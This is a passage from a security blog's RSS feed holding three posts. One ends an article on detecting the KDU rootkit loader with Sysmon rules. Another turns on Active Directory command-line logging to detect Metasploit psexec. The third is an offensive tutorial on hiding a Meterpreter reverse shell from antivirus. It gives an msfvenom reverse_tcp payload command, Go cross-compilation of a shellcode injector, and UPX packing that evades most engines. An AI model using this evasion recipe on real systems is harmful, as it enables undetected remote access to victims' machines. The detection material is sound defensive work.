&lt;p&gt;These detection techniques aren’t particularly sophisticated however, and nothing prevents an adversary from patching or tweaking these variables so KDU writes to different registry hives or disk locations. Or worse yet, making it load the victim and vulnerable drivers from memory instead of dumping them to disk first, in which case we would only see the starting and stopping of the vulnerable and victim driver services. Then simply patching the vulnerable drivers with arbitrary null bytes before loading them would modify the hashes detected by Sysmon. Such is life in cybersecurity… In part 2 we’re going to look at some more sophisticated evasion techniques that rootkits use, and how we can detect those too, so stay tuned!&lt;/p&gt;
&lt;p&gt;The supporting work in this area is my only credit, people like &lt;a href=&#34;https://twitter.com/hFireF0X&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@hfiref0x&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/FuzzySec&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@fuzzysec&lt;/a&gt;, and of course our dude &lt;a href=&#34;https://twitter.com/_batsec_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@_batsec_&lt;/a&gt; constantly finding ways to break the Windows kernel and invalidate the integrity of our operating systems is one of the many wonders of this world. &lt;/p&gt;
&lt;h2&gt;Appendix&lt;span class=&#34;absolute -mt-20&#34; id=&#34;appendix&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#appendix&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Some sysmon rules for detecting KDU and similar tools (the DriverLoad and ImageLoad events may require you to update your exclusion filters) as the vulnerable drivers that get loaded often appear legitimate and are even signed by Microsoft in the case of &lt;code&gt;**PROCEXP152**.sys&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.23&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;DriverLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;contains&amp;#34; name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34;&amp;gt;TempPROCEXP152.sys&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;Hashes condition=&amp;#34;is&amp;#34; name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34;&amp;gt;C06DDA757B92E79540551EFD00B99D4B&amp;lt;/Hashes&amp;gt;
            &amp;lt;/DriverLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;ImageLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;Signed name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;is&amp;#34;&amp;gt;false&amp;lt;/Signed&amp;gt;
                &amp;lt;ImageLoaded name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;is&amp;#34;&amp;gt;C:WindowsSystem32ntoskrnl.exe&amp;lt;/ImageLoaded&amp;gt;
            &amp;lt;/ImageLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;FileCreate onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;TargetFilename name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;AppDataLocalTempPROCEXP152.sys&amp;lt;/TargetFilename&amp;gt;
            &amp;lt;/FileCreate&amp;gt;
&amp;lt;FileCreate onmatch=&amp;#34;exclude&amp;#34;&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procexp64.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procexp.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procmon64.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procmon.exe&amp;lt;/Image&amp;gt;
            &amp;lt;/FileCreate&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;RegistryEvent onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;PROCEXP152ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;RTCore64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;GdrvImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;ATSZIOImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;MsIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;MsIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;GLCKIo2ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;WinRing0x64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;WinRing0_1_2_0ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneTechIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneTechIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;NalDrvImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;HKLM~&amp;lt;/TargetObject&amp;gt;
            &amp;lt;/RegistryEvent&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ol&gt;
&lt;li&gt;A basic PowerShell script for incident responders to help perform analysis on target machines. The script simply recurses through the entire &lt;code&gt;HKLM&lt;/code&gt; registry space and checks for any executable data (by checking the PE header magic bytes and length of the entry).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/thomjs/e7c5f6087ff646acf32dae89e9c7ecf2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gist.github.com/thomjs/e7c5f6087ff646acf32dae89e9c7ecf2&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hfiref0x/KDU/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/hfiref0x/KDU/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://swapcontext.blogspot.com/2020/01/unwinding-rtcore.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://swapcontext.blogspot.com/2020/01/unwinding-rtcore.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://eclypsium.com/wp-content/uploads/sites/2/2019/08/EXTERNAL-Get-off-the-kernel-if-you-cant-drive-DEFCON27.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://eclypsium.com/wp-content/uploads/sites/2/2019/08/EXTERNAL-Get-off-the-kernel-if-you-cant-drive-DEFCON27.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.fuzzysecurity.com/tutorials/expDev/23.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.fuzzysecurity.com/tutorials/expDev/23.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

      </description>
    </item>
    
    <item>
      <title>Bypassing Antivirus with Golang - Gopher it!</title>
      <link>//localhost:1313/articles/2019/06/2019-06-20-bypassing-antivirus-with-golang-gopher-it/</link>
      <pubDate>Thu, 20 Jun 2019 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2019/06/2019-06-20-bypassing-antivirus-with-golang-gopher-it/</guid>
      <description>
        
        
        &lt;p&gt;In this blog post, we’re going to detail a cool little trick we came across on how to bypass most antivirus products to get a Metepreter reverse shell on a target host. This all started when we came across &lt;a href=&#34;https://github.com/brimstone/go-shellcode&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;a Github repository written in Golang&lt;/a&gt;, which on execution could inject shellcode into running processes. By simply generating a payload with msfvenom we tested it and found that it was easily detected by Windows Defender. The Meterpreter payload was generated as follows:&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx -b \x00 -f hex&lt;/p&gt;
&lt;p&gt;The perk of using Go for this experiment is that it can be cross-compiled, from a Linux host for a target Windows host. The command to compile the application was:&lt;/p&gt;
&lt;p&gt;GOOS=windows GOARCH=amd64 go build&lt;/p&gt;
&lt;p&gt;This would produce a Go exe which would be executed from the command line, along with the shellcode the attacker wanted to inject. This was easily detected, and Windows Defender identified it as Meterpreter without any trouble. As a quick and easy bypass, we tried to compress the executable using UPX in brute mode, which repeatedly compresses it 8 times. No luck here either, as Windows Defender caught it again.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.1- Attempting to run the Go exe file with the shellcode as an argument. As you can see it was easily detected by Windows Defender. We then tried with the UPX compressed sc.exe file, which also didn’t work.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig2.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.2 - Of course, the Meterpreter session is killed as soon as the process is detected by Windows Defender.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;From here we inspected the source code of the Go program. After some review, we discovered that the main.go source file could be modified to take the shellcode as a variable then compiled – instead of compiling the .exe then adding the shellcode as a command line argument.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig3.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.3 - The go-shellcode/cmd/sc/main.go source.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig4.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.4 - The modified go-shellcode/cmd/sc/main.go source, where the reference to a command line argument is substituted for a declared variable.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;With these we compiled two .exe files, one to be tested without UPX compression, and one with UPX compression. Windows Defender detects the non-compressed version as soon as it touches disk, but does not detect the UPX compressed .exe with static analysis.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig5.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.5 - The .exe with no UPX compression is instantly detected as containing a Meterpreter payload by Windows Defender. No dice.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Running the custom UPX compressed .exe file is successful however, and a reverse shell is achieved!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig6.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.6 - Running the UPX compressed Go exe file is successful, and a reverse shell is achieved on the victim’s machine.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Fantastic. Let’s run it against VT to check how loud the signature for this is.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.7 - Uploading the UPX compressed Go exe file to Virus Total. Only Cybereason and Cylance detect the file as being malicious.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Only two antivirus engines are picking up that there is a malicious payload in this file, and both of them don’t specify what exactly about the upload is malicious, just that it IS malicious. The UPX compression is likely what’s triggering the alert, as UPX compression can be used to obfuscate malicious files.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/fig8.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Fig.8 - UPX compression in brute mode compresses the exe file 8 times.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;And that’s it! In this blog post we detailed how we modified a great Go program from Github (resource listed below) that performed shellcode injection into one that efficiently evaded most antivirus programs.&lt;/p&gt;
&lt;p&gt;The gist for this is available &lt;a href=&#34;https://gist.github.com/JumpsecLabs/202f95f9cce1ff35f140a37de0e62f30&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Reference:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/brimstone/go-shellcode&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/brimstone/go-shellcode&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://boyter.org/posts/trimming-golang-binary-fat/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://boyter.org/posts/trimming-golang-binary-fat/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.filippo.io/shrink-your-go-binaries-with-this-one-weird-trick/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.filippo.io/shrink-your-go-binaries-with-this-one-weird-trick/&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Enhanced logging to detect common attacks on Active Directory– Part 1</title>
      <link>//localhost:1313/articles/2019/02/2019-02-06-enhanced-logging-to-detect-common-attacks-on-active-directory-part-1/</link>
      <pubDate>Wed, 06 Feb 2019 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2019/02/2019-02-06-enhanced-logging-to-detect-common-attacks-on-active-directory-part-1/</guid>
      <description>
        
        
        &lt;p&gt;In this blog post I am going to tackle the topic of detecting common attacks using Active Directory logs. It is important to understand the power of data in InfoSec world. Too much data means you’ll be spending rest of the week digging through millions of log entries to try and figure out what the adversary was up to. You can set filters to help you through this, however it can get computationally expensive very fast depending on how your filters operate. It also requires you to know what to specifically look out for! You need to have confidence in your filters and test them thoroughly from time to time to make sure they actually work.&lt;/p&gt;
&lt;p&gt;On the other hand, too little data means you might not have enough log entries to investigate and provide full evidence of what malicious techniques were attempted. For this reason, it is a constant battle of finding the middle ground of having hard evidence and not overwhelming your SIEM. Another golden question to ask is: are we even logging the correct events?&lt;/p&gt;
&lt;p&gt;One of the ways to get around this problem is configuring the correct Group Policies on the Domain Controllers. In this blog post I want to focus solely on command line logging because it is a quick win and it shows immense amount of detail into what processes and commands are executed. We start off by enabling the correct settings in the Group Policy using Group Policy Editor. The steps are detailed below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Follow the path &lt;strong&gt;&lt;em&gt;Policies → Administrative Templates → System → Audit Process Creation. And enable “include command line in process creation events”&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Follow the path &lt;strong&gt;&lt;em&gt;Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → System Audit Policies → Detailed Tracking&lt;/em&gt;&lt;/strong&gt;. And enable both &lt;strong&gt;&lt;em&gt;Successful&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;Failure&lt;/em&gt;&lt;/strong&gt; configuration for “&lt;strong&gt;&lt;em&gt;Audit Process Creation&lt;/em&gt;&lt;/strong&gt;” and “&lt;em&gt;&lt;strong&gt;Audit Process Termination&lt;/strong&gt;&lt;/em&gt;” as shown below.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/2.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/3.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;After configuring these settings, run the good old group policy update on command prompt as administrator using the command &lt;strong&gt;&lt;em&gt;gpupdate /force&lt;/em&gt;&lt;/strong&gt;. At this point, you should be able to see all commands being executed via command prompt.&lt;/p&gt;
&lt;p&gt;We can test this by running some commands and viewing the logs to verify as shown below by running some test commands. We can see that by running test commands &lt;strong&gt;event ID 4688&lt;/strong&gt; (New process created) event is generated showing what was typed in the command prompt.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/4.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/5-3.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;img src=&#34;images/6-2.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now, we can move forward and test this with the psexec module from Metasploit using the &lt;em&gt;exploit/windows/smb/psexec&lt;/em&gt; module as shown below.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;After setting the correct parameters, we execute the exploit and observe the logs produced from this action.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/8.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now this will generate a lot of events and keeping up with the incoming logs using Windows Event Viewer will be almost impossible. The best way to analyse these events is to parse these events through a SIEM solution for better log management. After everything is set up correctly, we can now begin the hunt! Monitoring the recent activity on the target machine, we see some interesting events:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Event ID 7045&lt;/strong&gt; – A service was installed in the system&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/9.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The details around this event shows that the service named &lt;strong&gt;&lt;em&gt;yReAMNiNjOyqeWQI&lt;/em&gt;&lt;/strong&gt; was installed by the user root (which we know is the user used for this exploit). There are some interesting parameters defined here such as &lt;strong&gt;-nop&lt;/strong&gt;, &lt;strong&gt;-hidden&lt;/strong&gt; and &lt;strong&gt;-noni&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Such parameters can be used for obfuscation purposes. However, it becomes harder to detect these obfuscation parameters with keyword matching when there are multiple valid execution argument aliases for them. For example, for &lt;strong&gt;-NoProfile&lt;/strong&gt; argument alone, argument substrings such as &lt;strong&gt;-NoP&lt;/strong&gt;, &lt;strong&gt;-NoPr&lt;/strong&gt; &lt;strong&gt;-NoPro&lt;/strong&gt;, &lt;strong&gt;-NoProf&lt;/strong&gt;, &lt;strong&gt;-NoProfi&lt;/strong&gt; and &lt;strong&gt;-NoProfil&lt;/strong&gt; are all valid! This is where we chuck keyword matching filters out of the window and look towards regular expressions for detection.&lt;/p&gt;
&lt;p&gt;Focusing more on the name of the service being installed (&lt;em&gt;&lt;strong&gt;yReAMNiNjOyqeWQI&lt;/strong&gt;&lt;/em&gt;) looks like gibberish which is exactly what it is. Looking at the source code of the psexec module for Metasploit framework, we see that the display name is essentially 16 character long random text! We just found another possible filter that could help us detect these types of exploits.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/10.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Furthermore, we can also see a new process created (with &lt;strong&gt;event ID 4688&lt;/strong&gt;) which logs the actual command being executed during this attack!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/11.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Do you remember the thing we did with the group policies earlier? It wasn’t just to fill this blog post with random text and screenshots…nope… instead setting those group policies accordingly will allow you to log what was executed in command prompt as shown above! This is very useful in monitoring what crazy things are being executed on your windows network.&lt;/p&gt;
&lt;p&gt;That’s all for now, I hope you found this helpful as well as interesting. In the next part of this blog post series I will reveal more ingesting detection techniques.&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
